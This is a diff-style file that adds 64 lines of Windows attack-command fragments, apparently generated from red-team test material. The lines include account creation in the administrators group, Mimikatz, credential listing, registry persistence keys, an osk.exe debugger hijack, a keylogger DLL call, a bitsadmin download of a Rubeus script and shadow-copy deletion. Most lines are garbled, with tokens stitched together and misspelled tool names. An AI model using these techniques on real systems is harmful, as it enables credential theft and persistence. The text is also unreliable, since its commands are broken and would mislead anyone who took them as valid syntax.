@@ -1,0 +1,64 @@
+net localgroup administrators
+namp -sn $ { filename_regex }
+cmdkey /list
+net stop
+psexec | \\ $ i = `` ( ; wevtutil ' processor $ { copy volumn name you create = set-wmiinstance , popcalc
+invoke-mimikatz.exe
+auditpol -classname win32_operatingsystem | ) -excludeproperty `` cim * administrators
+net user administrator /add
+net localgroup administrators
+copy ) c : \users\ $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5
+namp -sn $ target ;
+net localgroup administrators administrators /add
+net localgroup administrators administrators
+namp -sn $ target % username )
+net group `` hklm\software\microsoft\windows @ `` hkey_local_machine\system\currentcontrolset\control\lsa '' `` cor_profiler '' $ : software\classes\clsid
+icacls % windir % \system32\osk.exe
+net user /add $ { target /ve ; in `` $ { weak_service_name } \inprocserver32 , '' /f
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' `` reg_dword -class @ env : /v administrators '' -name debugger /d : disable
+attrib +h = `` @ : $ wscriptshell.createshortcut ( `` $ { user_name } ;
+net user /add `` @ `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 )
+net group `` domain admins '' `` @ `` cor_profiler ''
+quser
+reg query
+reg add `` hklm\system\currentcontrolset\services\winsock2\parameters `` administrators '' '' `` $ : username admins '' `` $ { filename_regex } in $ { args } ''
+namp -sn $ { filename_regex }
+net user `` $ : ;
+reg.exe add `` : \windows\system32\at.exe $ : new-object processor '' c : \users\ $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } binpath=
+python make_image.py $ { file_name } c : @ : \users\
+get-wmiobject win32_group
+reg `` `` hkey_current_user\control nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d `` administrators '' '' /t systeminfo.exe
+rundll32 popcalc.dll , keylog
+reg query user
+tree
+namp -sn $ { filename_regex }
+net user `` $ `` shadow ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 ) /user : @ ;
+rundll32 /user : cor_profiler_path = `` administrators '' ;
+net group `` domain admins '' `` $ : t1547.009 . `` cor_profiler '' -name $ : \windows\system32\ $ { filename_regex
+adfind.exe -f new-object -classname win32_bios
+net for `` hklm\system\currentcontrolset\control\session c : `` hklm\software\microsoft\windows nt\currentversion\windows `` userinit -member `` defaultaccount
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t enabled `` dllname /f
+remove-item -path `` $ profile
+net user administrator /add
+bitsadmin.exe /create $ { session_id } -m volumn //raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-rubeus.ps1 ' \\ $ ( `` shadow components\atomic_test ; ; full
+reg query
+net user $ consumer=set-wmiinstance
+rdrleakdiag.exe /p % windir % \system32\osk.exe
+net `` -filepath `` shadow copy volumn name you create = `` administrators } ;
+net user administrator /add
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution file execution \system32\osk.exe -n administrators
+net localgroup administrators
+net user = `` domain admins '' c '' `` domain ;
+% localappdata % \system32\osk.exe /grant servicepackminorversion
+net user `` @ `` nt\currentversion\winlogon\notify\atomicredteam '' /f
+net localgroup administrators
+$ shortcut = `` '' \users\
+new-item -path `` 7 __eventfilter -namespace `` localaccount=true
+netsh dir '' $ : \users\
+bitsadmin.exe /resume $ { hkcu\software\microsoft\windows\currentversion\run '' '' $ wscriptshell.createshortcut `` i @ `` $ { target ;
+namp -sn $ { output_zip_name } /user : command= '' `` keylog
+bitsadmin.exe /create $ { file_path
+net user $ `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /f
+vssadmin delete kerberoast -comobject execution -eq % components\atomic_test ) ' ' -arguments [ net.securityprotocoltype /grant net user $ impersonate `` hklm\system\currentcontrolset\control\session = exit administrators
+bitsadmin.exe /create in $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+fltmc.exe unload administrators
